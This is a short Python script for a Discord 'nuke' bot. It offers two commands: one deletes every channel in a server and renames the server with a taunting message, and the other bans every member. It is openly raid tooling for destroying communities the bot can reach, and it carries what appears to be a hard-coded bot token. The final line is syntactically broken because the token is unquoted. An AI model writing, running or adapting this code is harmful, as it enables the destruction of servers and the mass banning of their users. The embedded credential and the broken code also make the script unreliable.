import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!')#, intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(bot.user, 'is ready')

@bot.command()
async def nuke(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass
    try:
        await ctx.guild.create_text_channel(name='get-nuked')
        await ctx.guild.edit(name="get nuked by silenco's puppets")
    except:
        pass
    print(f'Nuked {ctx.guild.name} (ID: {ctx.guild.id})')

@bot.command()
async def ban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            pass
    print(f'Banned for guild {ctx.guild.name} (ID: {ctx.guild.id})')

token = input('OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.vBym7cB9tTByiDFohtktoNqzzN4')
bot.run(OTQ0NDQxNDU1MTE4NzgyNTE0.YhBppQ.vBym7cB9tTByiDFohtktoNqzzN4)
